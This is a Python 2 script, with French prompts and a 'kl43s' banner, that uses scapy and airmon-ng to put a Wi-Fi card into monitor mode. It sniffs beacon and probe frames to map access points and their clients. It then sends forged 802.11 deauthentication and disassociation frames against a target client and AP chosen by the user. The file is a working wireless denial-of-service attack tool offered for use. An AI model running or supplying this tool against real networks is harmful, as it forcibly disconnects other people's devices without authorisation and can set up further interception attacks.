#coding: utf-8
from scapy.all import *
import signal
import os
import progressbar

result = []
stats = [[], [], [], []] #ssid bssid.addr1 bssid.addr2 bssid.addr3
ap = [[], []]
taille_max = 30
taille_max_mac = 17
bar = progressbar.progressbar



def signal_end():
	print "Mode monitor off\nservice NetworkInterface start...\nservice network-manager start..."
	os.system("airmon-ng stop wlan0mon")
	os.system("service network-manager start")
	os.system("service NetworkManager start")
	exit(0)


def clear():
	os.system('clear')

def Deauth():
	try:
		cible = raw_input("BSSID Machine\n>>> ")
		AP = raw_input("BSSID AP\n>>> ")
		print("inter = ", inter)
		nb = raw_input("Nombre de paquet deauth a envoyer\n>>> ")
		nb = int(nb)
		pkt = RadioTap()/Dot11(addr1=cible, addr2=AP, addr3=AP)/Dot11Deauth()/Dot11Disas()
		sendp(pkt, iface = inter, count = nb, inter = .000001)
	except RuntimeError:
		signal_end()

def affiche():
	for a in range(len(stats[0])):
		name = stats[0][a]
		bssid1 = stats[1][a]
		bssid = stats[2][a]
		bssid2 = stats[3][a]

	print "-------- APs --------\n"
	for i in range(len(ap[0])):
		print "[+]    AP : ", ap[0][i], " MAC : ", ap[1][i]
		for n in range(len(stats[0])):
			if ap[0][i] in stats[0][n]:
				print "\t--> machine : ", stats[2][n]
		print "\n"

	Deauth()

def signal_handler(sig, frame):
	clear()
	affiche()

def find_name(bssid):
	file = open("bssid.txt", "r")
	for line in file.read().splitlines():
		try:
			if line.split(" ~ ")[0][7] == bssid[7]:
				return line.split(" ~ ")[1].rstrip("\n")
		except TypeError:
			if line.split(" ~ ")[0][7] == "none":
				return line.split(" ~ ")[1].rstrip("\n")
	return "Inconnu"

def action(name, bssid1, bssid, bssid2):

	signal.signal(signal.SIGINT, signal_handler)

	if name != "":
		if name == '' or name == "none":
			name = find_name(bssid)

		if len(name) < taille_max:
			name = name + " "*(taille_max - len(name))
		try:
			info = "SSID: " + name + "   " + str(bssid) + " >>> " + str(bssid1) + " >>> " + str(bssid2)
		except TypeError:
			bssid = "none"
			info = "SSID: " + name + "   " + str(bssid) + " >>> " + str(bssid1) + " >>> " + str(bssid2)

		if info not in result :
			result.append(info)
			stats[0].append(name)
			stats[1].append(bssid1)
			stats[2].append(bssid)
			stats[3].append(bssid2)
			if bssid == bssid2:
				if bssid not in ap[1]:
					ap[0].append(name)
					ap[1].append(bssid2)

			if len(result) < 10:
				print len(result), " |", info
			else:
				print len(result), "|", info

def sniffpack(a):
	if a.haslayer(Dot11Beacon) or a.haslayer(Dot11ProbeReq):
		try:
			name = a.info
		except AttributeError:
			name = "none"
		try:
			bssid = a.addr2
		except ValueError:
			bssid = ""
		try:
			bssid1 = a.addr1
		except ValueError:
			bssid1 = ""
		try:
			bssid2 = a.addr3
		except ValueError:
			bssid2 = ""
		action(name, bssid1, bssid, bssid2)
def banner():
	print '''
#####################################
 #                                 #
  #                               #
   #                             #
    #                           #
     #                         #
     #  Chargement en cours... #
     #                         #
      #       Programme       #
       #       [kl43s]       #
        #                   #
         #                 #
          #               #
           #             #
            #           #
             #         #
              #[kl43s]#
               #     #
                #   #
                  #
'''
os.system("airmon-ng start wlan0")
clear()
for i in bar(range(100), redirect_stdout=True):
	time.sleep(0.02)
	if i == 1:
		inter = subprocess.check_output("iwconfig | sed -n 1p | awk -F' ' '{print $1}'", shell=True).split('\n')[0]
		clear()
		banner()
clear()

sniff(iface=inter, prn = sniffpack)
